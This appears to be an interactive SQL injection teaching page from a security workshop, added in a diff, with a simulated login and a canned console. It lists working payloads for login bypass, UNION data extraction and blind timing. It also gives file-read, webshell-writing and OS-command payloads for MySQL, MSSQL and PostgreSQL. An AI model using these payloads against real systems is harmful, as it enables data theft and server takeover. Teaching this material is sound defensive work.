@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SQL Injection Lab — Securinets Esprit</title>
+<style>
+:root{
+  --red:#b31217; --red-dark:#7a0d10; --red-light:#e23a3e;
+  --bg:#ffffff; --bg2:#f7f3f3; --ink:#161414; --ink2:#5a5252;
+  --line:#e7dede; --danger:#b31217; --safe:#1d7a4a; --mono:ui-monospace,Consolas,monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){
+  :root{ --bg:#141011; --bg2:#1c1617; --ink:#f2eaea; --ink2:#c9b9b9; --line:#3a2b2c; }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:system-ui,sans-serif;line-height:1.6;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+.hero{
+  background:
+    radial-gradient(circle at 20px 20px, var(--red) 1.4px, transparent 1.6px) 0 0/16px 16px,
+    linear-gradient(180deg,var(--ink) 0%, var(--red-dark) 70%, var(--red) 100%);
+  color:#fff;padding:3rem 1.5rem 2.5rem;text-align:center
+}
+.hero h1{margin:.2rem 0;font-size:clamp(28px,5vw,42px);letter-spacing:1px}
+.hero h1 span{color:#ffd9d9}
+.hero p{color:#f0d6d6;max-width:620px;margin:.6rem auto 0;font-size:15px}
+.badge{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.35);
+  border-radius:999px;padding:4px 14px;font-size:12px;letter-spacing:2px;text-transform:uppercase}
+main{max-width:780px;margin:0 auto;padding:1.5rem}
+section{margin:2.5rem 0;padding-top:.5rem}
+h2{font-size:21px;border-left:4px solid var(--red);padding-left:10px;margin-bottom:.3rem}
+.step{color:var(--red);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase}
+p.lead{color:var(--ink2);font-size:15px}
+.card{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;margin:1rem 0}
+pre{font-family:var(--mono);font-size:13.5px;white-space:pre-wrap;word-break:break-word;margin:0;line-height:1.7}
+.tag{color:var(--ink2)}
+.kw{color:var(--red-light);font-weight:600}
+.inject{background:#fde3e3;color:#7a0d10;border-radius:4px;padding:1px 3px}
+.inject.danger{background:var(--red);color:#fff;font-weight:600}
+@media (prefers-color-scheme: dark){.inject{background:#4a1416;color:#ffb3b3}.inject.danger{background:var(--red);color:#fff}}
+input[type=text]{width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid var(--line);
+  background:var(--bg);color:var(--ink);font-family:var(--mono);font-size:14px}
+input[type=text]:focus{outline:2px solid var(--red-light);border-color:var(--red-light)}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:.7rem}
+button{background:var(--red);color:#fff;border:0;border-radius:10px;padding:10px 16px;
+  font-size:13.5px;font-weight:600;cursor:pointer}
+button.ghost{background:transparent;border:1.5px solid var(--red);color:var(--red)}
+button:active{transform:scale(.97)}
+.status{font-size:13px;font-weight:600;padding:8px 12px;border-radius:8px;margin-top:.6rem;display:none}
+.status.safe{display:block;background:#e4f5ec;color:var(--safe)}
+.status.danger{display:block;background:#fbe2e2;color:var(--danger)}
+@media (prefers-color-scheme: dark){.status.safe{background:#123324}.status.danger{background:#3a1214}}
+.browser{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-top:1rem}
+.browser .bar{background:var(--bg2);padding:7px 10px;font-size:12px;color:var(--ink2);border-bottom:1px solid var(--line);display:flex;gap:6px;align-items:center}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--line)}
+.browser .page{padding:16px;min-height:60px;font-size:14px;background:var(--bg)}
+.payloads{display:grid;gap:10px}
+.pl{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+.pl code{font-family:var(--mono);font-size:13px;color:var(--red-light);word-break:break-word}
+.pl .why{color:var(--ink2);font-size:13px;margin-top:5px}
+.pl button{margin-top:8px}
+.copied{color:var(--safe);font-size:12px;font-weight:600;margin-left:8px}
+.flow{display:flex;align-items:center;justify-content:space-between;margin:1.2rem 0;position:relative}
+.flow .node{flex:1;text-align:center;font-size:12.5px;color:var(--ink2)}
+.flow .node i{display:block;width:46px;height:46px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--line);
+  margin:0 auto 6px;font-size:20px;display:flex;align-items:center;justify-content:center}
+.flow .track{flex:2;height:2px;background:var(--line);position:relative;margin-top:-24px}
+.flow .dot{position:absolute;top:-4px;left:0;width:10px;height:10px;border-radius:50%;background:var(--red);opacity:0}
+.flow .dot.go{animation:travel 1.4s ease forwards}
+@keyframes travel{0%{left:0;opacity:1}90%{opacity:1}100%{left:calc(100% - 10px);opacity:1}}
+.steps{margin-top:.6rem}
+.steps div{opacity:0;transform:translateY(4px);transition:opacity .3s,transform .3s;font-size:13.5px;color:var(--ink2);padding:3px 0}
+.steps div.show{opacity:1;transform:none}
+.steps div b{color:var(--ink)}
+footer{text-align:center;color:var(--ink2);font-size:12px;padding:2rem 1rem}
+
+/* ===== shared reveal/animation system (same visual language as the XSS lab) ===== */
+.xv-wrap{margin-top:1.1rem;border:1px solid var(--line);border-radius:14px;padding:14px 16px;background:var(--bg2)}
+.xv-title{font-size:11.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink2);font-weight:700;margin-bottom:10px}
+
+.xv-boundary{position:relative;display:flex;gap:0;border-radius:10px;overflow:hidden;border:1.5px solid var(--line)}
+.xv-zone{flex:1;padding:16px 12px;text-align:center;font-size:12.5px;color:var(--ink2);position:relative;background:var(--bg);transition:background .35s,color .35s}
+.xv-zone .xv-ico{font-size:22px;display:block;margin-bottom:4px}
+.xv-zone.xv-data{border-right:1.5px dashed var(--line)}
+.xv-zone.xv-code.xv-hot{background:var(--red);color:#fff}
+.xv-zone.xv-code.xv-hot .xv-ico{animation:xv-shake .4s ease}
+.xv-zone.xv-data.xv-calm{background:#e4f5ec}
+@media (prefers-color-scheme: dark){.xv-zone.xv-data.xv-calm{background:#123324}}
+.xv-ball{position:absolute;top:50%;left:8%;width:12px;height:12px;border-radius:50%;background:var(--red);
+  transform:translate(0,-50%) scale(0);box-shadow:0 0 0 0 rgba(179,18,23,.5);z-index:2}
+.xv-ball.xv-fire-safe{animation:xv-hop-safe 1s ease forwards}
+.xv-ball.xv-fire-danger{animation:xv-hop-danger 1s ease forwards}
+@keyframes xv-hop-safe{0%{left:8%;transform:translate(0,-50%) scale(1)}100%{left:42%;transform:translate(0,-50%) scale(1)}}
+@keyframes xv-hop-danger{0%{left:8%;transform:translate(0,-50%) scale(1)}55%{left:50%;transform:translate(0,-70%) scale(1.15)}100%{left:88%;transform:translate(0,-50%) scale(1)}}
+@keyframes xv-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px) rotate(-6deg)}75%{transform:translateX(3px) rotate(6deg)}}
+.xv-caption{text-align:center;font-size:12px;color:var(--ink2);margin-top:8px;min-height:16px}
+
+.xv-tl{display:flex;flex-direction:column;gap:0;margin-top:4px}
+.xv-tlrow{display:flex;gap:10px;align-items:flex-start;opacity:.25;transform:translateX(-6px);transition:opacity .35s,transform .35s}
+.xv-tlrow.on{opacity:1;transform:none}
+.xv-tlnum{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:var(--bg);border:1.5px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--ink2);margin-top:1px}
+.xv-tlrow.on .xv-tlnum{background:var(--red);border-color:var(--red);color:#fff}
+.xv-tltext{font-size:13px;color:var(--ink2);padding-top:2px}
+.xv-tlrow.on .xv-tltext{color:var(--ink)}
+.xv-tlline{width:1.5px;background:var(--line);margin-left:10.25px;height:14px}
+.xv-tlrow.on + .xv-tlline{background:var(--red)}
+.xv-flash{position:relative}
+.xv-flash.xv-pulse::after{content:"";position:absolute;inset:0;border-radius:12px;pointer-events:none;
+  box-shadow:0 0 0 0 rgba(179,18,23,.55);animation:xv-ring .6s ease}
+@keyframes xv-ring{0%{box-shadow:0 0 0 0 rgba(179,18,23,.55)}100%{box-shadow:0 0 0 14px rgba(179,18,23,0)}}
+
+.xv-ctxmap{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px}
+.xv-ctx{border:1.5px solid var(--line);border-radius:10px;padding:10px;text-align:center;font-size:12px;color:var(--ink2);
+  background:var(--bg);opacity:0;transform:translateY(6px);transition:opacity .4s,transform .4s}
+.xv-ctx.show{opacity:1;transform:none}
+.xv-ctx .xv-ico{font-size:20px;display:block;margin-bottom:4px;animation:xv-float 2.6s ease-in-out infinite}
+.xv-ctx code{display:block;margin-top:5px;font-family:var(--mono);font-size:11px;color:var(--red-light);word-break:break-word}
+@keyframes xv-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
+
+.xv-hijack{display:flex;align-items:center;gap:6px;justify-content:space-between;margin-top:6px}
+.xv-hpanel{flex:1;text-align:center;font-size:12px;color:var(--ink2);padding:10px 6px;border-radius:10px;border:1.5px solid var(--line);background:var(--bg)}
+.xv-hpanel .xv-ico{font-size:24px;display:block;margin-bottom:4px}
+.xv-harrow{flex:0 0 28px;text-align:center;color:var(--red);font-size:18px;position:relative;overflow:visible}
+.xv-harrow span{display:inline-block;animation:xv-drift 1.4s ease-in-out infinite}
+@keyframes xv-drift{0%,100%{transform:translateX(0);opacity:.6}50%{transform:translateX(4px);opacity:1}}
+.xv-hpanel.xv-win{border-color:var(--red);background:#fde3e3}
+@media (prefers-color-scheme: dark){.xv-hpanel.xv-win{background:#4a1416}}
+
+/* ===== SQLi-specific additions ===== */
+.sq-query{font-family:var(--mono);font-size:13px;line-height:1.9}
+.sq-fixed{color:var(--ink2)}
+.sq-slot{background:#fde3e3;color:#7a0d10;border-radius:4px;padding:1px 3px}
+.sq-slot.danger{background:var(--red);color:#fff;font-weight:600}
+@media (prefers-color-scheme: dark){.sq-slot{background:#4a1416;color:#ffb3b3}.sq-slot.danger{background:var(--red);color:#fff}}
+
+.sq-dbgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.sq-db{border:1.5px solid var(--line);border-radius:12px;padding:12px;background:var(--bg);
+  opacity:0;transform:translateY(8px);transition:opacity .4s,transform .4s}
+.sq-db.show{opacity:1;transform:none}
+.sq-db .name{font-weight:700;font-size:13px;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.sq-db .name .xv-ico{font-size:16px}
+.sq-db .row2{font-size:11.5px;color:var(--ink2);margin-top:5px}
+.sq-db code{font-family:var(--mono);font-size:11.5px;color:var(--red-light);word-break:break-word}
+
+.sq-results{margin-top:.8rem;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.sq-results table{width:100%;border-collapse:collapse;font-size:12.5px}
+.sq-results th{background:var(--bg2);text-align:left;padding:7px 10px;color:var(--ink2);font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.sq-results td{padding:7px 10px;border-top:1px solid var(--line)}
+.sq-results tr.leak td{background:#fde3e3;color:#7a0d10;font-weight:600}
+@media (prefers-color-scheme: dark){.sq-results tr.leak td{background:#4a1416;color:#ffb3b3}}
+.sq-rowcount{font-size:12px;color:var(--ink2);padding:8px 10px;border-top:1px solid var(--line);background:var(--bg2)}
+
+/* terminal / console */
+.sq-term{border-radius:12px;overflow:hidden;margin-top:1rem;border:1px solid var(--line)}
+.sq-term .bar{background:#2a2222;padding:7px 10px;font-size:12px;color:#d8caca;display:flex;gap:6px;align-items:center}
+.sq-term .screen{background:#120e0e;color:#8df0a0;font-family:var(--mono);font-size:12.5px;padding:14px;
+  min-height:70px;white-space:pre-wrap;word-break:break-word;line-height:1.7}
+.sq-term .screen .err{color:#ff9b9b}
+.sq-term .screen .hdr{color:#ffd9d9}
+.sq-term .caret{display:inline-block;width:7px;height:13px;background:#8df0a0;vertical-align:-2px;animation:xv-caret 1s step-end infinite}
+@keyframes xv-caret{50%{opacity:0}}
+.sq-sim-badge{display:inline-block;font-size:10.5px;letter-spacing:1px;text-transform:uppercase;font-weight:700;
+  color:var(--ink2);background:var(--bg2);border:1px solid var(--line);border-radius:999px;padding:2px 9px;margin-left:6px}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="badge">Securinets Esprit</span>
+  <h1>SQL <span>Injection</span></h1>
+  <p>A hands-on walkthrough. You will break the boundary between data and code — live, in your browser. Everything below runs against a simulated database, nothing here touches a real server.</p>
+</div>
+
+<main>
+
+<section id="s1">
+  <div class="step">Step 1 — the code behind the search box</div>
+  <h2>Where does your typing go?</h2>
+  <p class="lead">This site has a product search box. Below is the real query the backend builds by gluing your
+  text straight into a SQL string — nobody checks what you type first.</p>
+
+  <div class="card">
+    <pre class="sq-query"><span class="sq-fixed">SELECT * FROM products WHERE name = '</span><span id="slot" class="sq-slot">your text shows up here</span><span class="sq-fixed">';</span></pre>
+  </div>
+
+  <input type="text" id="liveInput" placeholder="Type something, e.g. shoes" autocomplete="off">
+  <div id="status1" class="status"></div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Live view — does your text stay data, or become SQL?</div>
+    <div class="xv-boundary" id="xvBoundary">
+      <div class="xv-zone xv-data" id="xvZoneData"><span class="xv-ico">🔎</span>Search term<br>(just matched)</div>
+      <div class="xv-zone xv-code" id="xvZoneCode"><span class="xv-ico">🗄️</span>SQL engine<br>(gets executed)</div>
+      <div class="xv-ball" id="xvBall"></div>
+    </div>
+    <div class="xv-caption" id="xvCaption">Start typing above — watch which side the dot lands on.</div>
+  </div>
+</section>
+
+<section id="s2">
+  <div class="step">Step 2 — your first real payload</div>
+  <h2>Copy it. Paste it above. Watch the query break.</h2>
+  <p class="lead">A payload is just text crafted to close the quote early. This one turns a single search box
+  into a login bypass — no password ever checked.</p>
+
+  <div class="pl">
+    <code id="p1">' OR '1'='1' -- -</code>
+    <div class="why">A single quote closes the string the backend opened for you. <code>OR '1'='1'</code> is
+    always true, so the WHERE clause matches everything. <code>-- -</code> comments out whatever the backend
+    was going to append after your input — the stray trailing quote never gets a chance to break the syntax.</div>
+    <div class="row">
+      <button onclick="useThis('p1')">Use this payload</button>
+      <span class="copied" id="copiedMsg"></span>
+    </div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem">The box below is a real, working mini backend — a tiny simulated
+  users table it queries exactly the way the SQL above describes. If it logs you in as admin, that's not a
+  trick: your text really did become part of the query.</p>
+
+  <div class="xv-flash" id="xvBrowserFlash">
+  <div class="browser">
+    <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+      &nbsp; simulated login — really running your query</div>
+    <div class="page">
+      <div style="font-size:12.5px;color:var(--ink2);margin-bottom:6px">Login as: <code>guest</code> — password field below:</div>
+      <div id="renderedPage" class="sq-query"><span class="sq-fixed">SELECT * FROM users WHERE user='guest' AND pass='</span><span id="renderedSlot" class="sq-slot">—</span><span class="sq-fixed">';</span></div>
+    </div>
+  </div>
+  </div>
+  <div id="status2" class="status"></div>
+
+  <div class="sq-results" id="sqResults" style="display:none">
+    <table>
+      <thead><tr><th>id</th><th>user</th><th>password_hash</th><th>role</th></tr></thead>
+      <tbody id="sqResultsBody"></tbody>
+    </table>
+    <div class="sq-rowcount" id="sqRowCount"></div>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">What the database does, step by step</div>
+    <div class="xv-tl" id="xvTimeline">
+      <div class="xv-tlrow" id="xvT1"><div class="xv-tlnum">1</div><div class="xv-tltext">The backend builds <code>...pass='[your input]';</code> by string-concatenation, no escaping.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT2"><div class="xv-tlnum">2</div><div class="xv-tltext">Your <code>'</code> closes the string early — the parser now reads the rest of your text as SQL, not as a password.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT3"><div class="xv-tlnum">3</div><div class="xv-tltext"><code>OR '1'='1'</code> is appended to the WHERE clause — it's always true, for every row.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT4"><div class="xv-tlnum">4</div><div class="xv-tltext"><code>-- -</code> comments out the original trailing quote, so the query stays syntactically valid and runs.</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="s3">
+  <div class="step">Step 3 — same idea, different database</div>
+  <h2>Payloads aren't one-size-fits-all</h2>
+  <p class="lead">The logic above — "close the string, inject a true condition, comment out the rest" — is
+  universal. But the exact syntax for comments, string concatenation, and reading internal data changes
+  from one database engine to another. Using the wrong dialect is the #1 reason a working injection looks
+  "blocked" when it isn't.</p>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Comment syntax &amp; quirks by engine</div>
+    <div class="sq-dbgrid" id="sqDbGrid">
+      <div class="sq-db" id="db1"><div class="name"><span class="xv-ico">🐬</span>MySQL / MariaDB</div>
+        <div class="row2">Comment: <code>-- </code> (needs trailing space) or <code>#</code></div>
+        <div class="row2">Concat: <code>CONCAT(a,b)</code></div>
+        <div class="row2">Schema: <code>information_schema.tables</code></div></div>
+      <div class="sq-db" id="db2"><div class="name"><span class="xv-ico">🐘</span>PostgreSQL</div>
+        <div class="row2">Comment: <code>--</code> (no space needed)</div>
+        <div class="row2">Concat: <code>a || b</code></div>
+        <div class="row2">Schema: <code>information_schema.tables</code></div></div>
+      <div class="sq-db" id="db3"><div class="name"><span class="xv-ico">🪟</span>MS SQL Server</div>
+        <div class="row2">Comment: <code>--</code></div>
+        <div class="row2">Concat: <code>a + b</code></div>
+        <div class="row2">Schema: <code>sys.tables</code>, stacked queries allowed</div></div>
+      <div class="sq-db" id="db4"><div class="name"><span class="xv-ico">🔶</span>Oracle</div>
+        <div class="row2">Comment: <code>--</code></div>
+        <div class="row2">Concat: <code>a || b</code></div>
+        <div class="row2">Schema: <code>ALL_TABLES</code>, every <code>SELECT</code> needs <code>FROM dual</code></div></div>
+      <div class="sq-db" id="db5"><div class="name"><span class="xv-ico">🪶</span>SQLite</div>
+        <div class="row2">Comment: <code>--</code></div>
+        <div class="row2">Concat: <code>a || b</code></div>
+        <div class="row2">Schema: <code>sqlite_master</code>, no stacked queries via most drivers</div></div>
+    </div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem">That's also why attackers fingerprint the database first — usually
+  by seeing which error message or which comment style makes the query behave as expected — before picking
+  the rest of their payloads.</p>
+</section>
+
+<section id="s4">
+  <div class="step">Step 4 — pulling data out with UNION</div>
+  <h2>From "always true" to "show me everything"</h2>
+  <p class="lead">Bypassing a login proves the injection works. <code>UNION SELECT</code> is how attackers go
+  further — appending a second, attacker-chosen query whose results get merged into the page's normal output.
+  It only needs the same number of columns as the original query.</p>
+
+  <div class="xv-wrap" style="margin-bottom:1rem">
+    <div class="xv-title">Where your text can land in a query</div>
+    <div class="xv-ctxmap" id="xvCtxMap">
+      <div class="xv-ctx" id="xvCtx1"><span class="xv-ico">🔤</span>Inside a string<code>name = '[you]'</code></div>
+      <div class="xv-ctx" id="xvCtx2"><span class="xv-ico">🔢</span>Inside a number<code>id = [you]</code></div>
+      <div class="xv-ctx" id="xvCtx3"><span class="xv-ico">↕️</span>Inside ORDER BY<code>ORDER BY [you]</code></div>
+    </div>
+  </div>
+
+  <div class="payloads" id="payloadList"></div>
+</section>
+
+<section id="s5">
+  <div class="step">Step 5 (bonus) — reading files and running commands</div>
+  <h2>When the database can touch the server itself</h2>
+  <p class="lead">Some engines ship functions that go past the data in the tables and reach the filesystem or
+  the operating system directly. If the database account has the privilege, SQL injection stops being "leak a
+  table" and becomes "read any file" or "run any command" on the server. The console below is a
+  <b>simulation</b> — it plays back canned output so you can see the impact without touching a real system.</p>
+
+  <div class="payloads" id="rcePayloadList"></div>
+
+  <div class="sq-term">
+    <div class="bar"><span class="dot" style="background:#ff6159"></span><span class="dot" style="background:#ffbd2e"></span><span class="dot" style="background:#27c93f"></span>
+      &nbsp;db-server — simulated console<span class="sq-sim-badge">simulated</span></div>
+    <div class="screen" id="sqConsole">waiting for a payload above<span class="caret"></span></div>
+  </div>
+</section>
+
+<section id="s6">
+  <div class="step">Step 6 — why this is a big deal</div>
+  <h2>It's never just "one extra row"</h2>
+  <p class="lead">A bypassed login proves the query ran. In a real attack, the same flaw usually means every
+  row, in every table, is readable — and on a misconfigured server, the database account's filesystem or
+  command privileges turn into a full foothold on the machine.</p>
+
+  <div class="card">
+    <pre class="sq-query"><span class="sq-fixed">' UNION SELECT user, password, 3 FROM admin_users-- -</span></pre>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">From one text box to full compromise</div>
+    <div class="xv-hijack">
+      <div class="xv-hpanel"><span class="xv-ico">🔎</span>One search<br>box, no filter</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel"><span class="xv-ico">🗂️</span>Every table<br>in the database</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel xv-win"><span class="xv-ico">🖥️</span>Files &amp; commands<br>on the server</div>
+    </div>
+  </div>
+
+  <p class="lead">Ask yourself every time: <b>where does my text end up in the query, and what privileges does
+  the account running that query actually have?</b></p>
+</section>
+
+</main>
+<footer>Securinets Esprit — Web Exploitation Workshop</footer>
+
+<script>
+/* ---------------- simulated users table ---------------- */
+const USERS = [
+  {id:1, user:'guest',  password_hash:'5f4dcc3b5aa765d6', role:'guest'},
+  {id:2, user:'admin',  password_hash:'e99a18c428cb38d5', role:'admin'},
+  {id:3, user:'jsmith', password_hash:'a9f0e61a137d8627', role:'staff'},
+  {id:4, user:'rkader', password_hash:'0d61f8370cad1d41', role:'staff'}
+];
+
+function decodeHtml(s){ const t=document.createElement('textarea'); t.innerHTML=s; return t.value; }
+
+function isDangerous(v){
+  return /'|--|;|\bor\b\s*['"0-9]|\bunion\b\s*\bselect\b/i.test(v);
+}
+
+function useThis(id){
+  const raw = decodeHtml(document.getElementById(id).innerHTML);
+  liveInput.value = raw;
+  render(raw);
+  const msg = document.getElementById('copiedMsg');
+  if(msg){ msg.textContent = 'loaded into the input above ↑'; setTimeout(()=>msg.textContent='',2000); }
+  document.getElementById('s1').scrollIntoView({behavior:'smooth', block:'center'});
+}
+
+function render(v){
+  const slot = document.getElementById('slot');
+  const status1 = document.getElementById('status1');
+  const danger = isDangerous(v);
+  slot.textContent = v || 'your text shows up here';
+  slot.className = 'sq-slot' + (danger ? ' danger' : '');
+  if(!v){ status1.className='status'; status1.textContent=''; }
+  else if(danger){
+    status1.className='status danger';
+    status1.textContent = "The database parser now sees part of this as SQL syntax, not as a search string.";
+  } else {
+    status1.className='status safe';
+    status1.textContent = "This stays a plain string literal. The engine just matches it, nothing extra runs.";
+  }
+
+  const renderedSlot = document.getElementById('renderedSlot');
+  const status2 = document.getElementById('status2');
+  const resultsBox = document.getElementById('sqResults');
+  const body = document.getElementById('sqResultsBody');
+  const rowCount = document.getElementById('sqRowCount');
+
+  renderedSlot.textContent = v || '—';
+  renderedSlot.className = 'sq-slot' + (danger ? ' danger' : '');
+
+  if(!v){
+    status2.className='status'; status2.textContent='';
+    resultsBox.style.display='none';
+    return;
+  }
+
+  const bypass = /'\s*or\s*'?1'?\s*=\s*'?1/i.test(v) || /'\s*or\s*1\s*=\s*1/i.test(v);
+
+  if(bypass){
+    status2.className='status danger';
+    status2.textContent='This is really happening: the WHERE clause is always true now — every row matched, password never actually checked.';
+    body.innerHTML = USERS.map(u=>`<tr class="leak"><td>${u.id}</td><td>${u.user}</td><td>${u.password_hash}</td><td>${u.role}</td></tr>`).join('');
+    rowCount.textContent = USERS.length + ' rows returned — logged in as the first match: admin';
+    resultsBox.style.display='block';
+  } else if(danger){
+    status2.className='status danger';
+    status2.textContent='The query no longer parses the way the backend intended — on a real server this usually throws a SQL syntax error back to you.';
+    resultsBox.style.display='none';
+  } else {
+    status2.className = v ? 'status safe' : 'status';
+    status2.textContent = v ? 'Treated as a plain password string. No match, login rejected — as intended.' : '';
+    resultsBox.style.display='none';
+  }
+}
+
+const liveInput = document.getElementById('liveInput');
+liveInput.addEventListener('input', ()=>render(liveInput.value));
+render('');
+
+/* ---------------- Step 4 payload list ---------------- */
+const payloads = [
+  {code:"' OR 1=1-- -", why:"Classic always-true bypass when input lands inside a quoted string, e.g. name = '[input]'. Works across MySQL, PostgreSQL, MSSQL and SQLite."},
+  {code:"1 OR 1=1", why:"Same idea, but no quote needed because the input lands directly in a numeric context, e.g. id = [input] — common in product or user ID lookups."},
+  {code:"' UNION SELECT username, password, 3-- -", why:"Appends a second query whose results get merged into the page. The number of columns (here 3) must match the original SELECT exactly, or the database errors out."},
+  {code:"' ORDER BY 5-- -", why:"Used before a UNION attack to find out how many columns the original query has — keep raising the number until the query errors, then subtract one."},
+  {code:"' AND SLEEP(5)-- -", why:"A blind / time-based payload: when you can't see the data directly, a 5-second delay in the response proves the injection works and lets you extract data one true/false question at a time."}
+];
+const list = document.getElementById('payloadList');
+payloads.forEach((p,i)=>{
+  const id = 'pl'+i;
+  const div = document.createElement('div');
+  div.className='pl';
+  div.innerHTML = `<code id="${id}">${p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code><div class="why">${p.why}</div>
+    <button onclick="useThis('${id}')">Try this payload</button>`;
+  list.appendChild(div);
+});
+
+/* ---------------- Step 5: simulated file-read / RCE console ---------------- */
+const rcePayloads = [
+  {
+    id:'rc0', engine:'MySQL',
+    code:"' UNION SELECT load_file('/etc/passwd'),2,3-- -",
+    why:"MySQL's load_file() reads a file straight off the server's disk, if the DB account has the FILE privilege and the file is world-readable.",
+    out:
+`<span class="hdr">$ simulated query ></span> ' UNION SELECT load_file('/etc/passwd'),2,3-- -
+
+<span class="hdr">-- load_file('/etc/passwd') --</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+app:x:1001:1001:app svc:/home/app:/bin/bash
+
+<span class="err">[simulated] no real file was read — this is canned demo output.</span>`
+  },
+  {
+    id:'rc1', engine:'MySQL',
+    code:"' UNION SELECT '<?php system($_GET[1]);?>',2 INTO OUTFILE '/var/www/html/shell.php'-- -",
+    why:"If the account also has FILE write access and knows the web root, it can write a PHP webshell straight into a directory the server serves — turning the SQLi into full remote code execution.",
+    out:
+`<span class="hdr">$ simulated query ></span> ... INTO OUTFILE '/var/www/html/shell.php'-- -
+
+<span class="hdr">-- write result --</span>
+1 file written: /var/www/html/shell.php (41 bytes)
+
+<span class="hdr">$ simulated ></span> curl http://target/shell.php?1=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+<span class="err">[simulated] no file was written and no request was sent — demo output only.</span>`
+  },
+  {
+    id:'rc2', engine:'MS SQL Server',
+    code:"'; EXEC xp_cmdshell('whoami')-- -",
+    why:"MSSQL's xp_cmdshell runs an operating-system command directly from SQL, if it's enabled (it's off by default, but injection can sometimes re-enable it via sp_configure).",
+    out:
+`<span class="hdr">$ simulated query ></span> '; EXEC xp_cmdshell('whoami')-- -
+
+<span class="hdr">-- xp_cmdshell output --</span>
+nt authority\\system
+
+<span class="err">[simulated] no shell command actually ran — canned demo output.</span>`
+  },
+  {
+    id:'rc3', engine:'PostgreSQL',
+    code:"'; COPY (SELECT '') TO PROGRAM 'id'-- -",
+    why:"PostgreSQL's COPY ... TO PROGRAM pipes query output through an arbitrary shell command, if the account is a superuser — effectively the Postgres equivalent of xp_cmdshell.",
+    out:
+`<span class="hdr">$ simulated query ></span> '; COPY (SELECT '') TO PROGRAM 'id'-- -
+
+<span class="hdr">-- program output --</span>
+uid=70(postgres) gid=70(postgres) groups=70(postgres)
+
+<span class="err">[simulated] no program was executed — canned demo output.</span>`
+  },
+  {
+    id:'rc4', engine:'SQLite',
+    code:"' UNION SELECT sql,2,3 FROM sqlite_master-- -",
+    why:"SQLite has no filesystem or OS-command functions by default — the realistic 'worst case' here is dumping sqlite_master to read the full schema of every table in the file.",
+    out:
+`<span class="hdr">$ simulated query ></span> ' UNION SELECT sql,2,3 FROM sqlite_master-- -
+
+<span class="hdr">-- sqlite_master.sql --</span>
+CREATE TABLE users(id INTEGER, user TEXT, password_hash TEXT, role TEXT)
+CREATE TABLE orders(id INTEGER, user_id INTEGER, total REAL)
+CREATE TABLE sessions(token TEXT, user_id INTEGER, expires INTEGER)
+
+<span class="err">[simulated] no database file was touched — canned demo output.</span>`
+  }
+];
+
+const rceList = document.getElementById('rcePayloadList');
+rcePayloads.forEach(p=>{
+  const div = document.createElement('div');
+  div.className='pl';
+  const safeCode = p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const safeWhy = p.why.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  div.innerHTML = `<code>${safeCode}</code>
+    <div class="why"><b>${p.engine}.</b> ${safeWhy}</div>
+    <div class="row"><button onclick="runConsole('${p.id}')">Run (simulated)</button></div>`;
+  rceList.appendChild(div);
+});
+
+const rceById = Object.fromEntries(rcePayloads.map(p=>[p.id,p]));
+let consoleTyping = null;
+
+function runConsole(id){
+  const p = rceById[id];
+  if(!p) return;
+  const screen = document.getElementById('sqConsole');
+  if(consoleTyping) clearInterval(consoleTyping);
+  screen.classList.remove('xv-pulse');
+  // reveal line by line for a "running" feel; each line is already a complete HTML fragment
+  const lines = p.out.split('\n');
+  let out = '';
+  let idx = 0;
+  screen.innerHTML = '<span class="caret"></span>';
+  consoleTyping = setInterval(()=>{
+    if(idx >= lines.length){
+      clearInterval(consoleTyping);
+      screen.innerHTML = out + '<span class="caret"></span>';
+      return;
+    }
+    out += (idx>0 ? '\n' : '') + lines[idx];
+    screen.innerHTML = out + '<span class="caret"></span>';
+    idx++;
+  }, 90);
+}
+
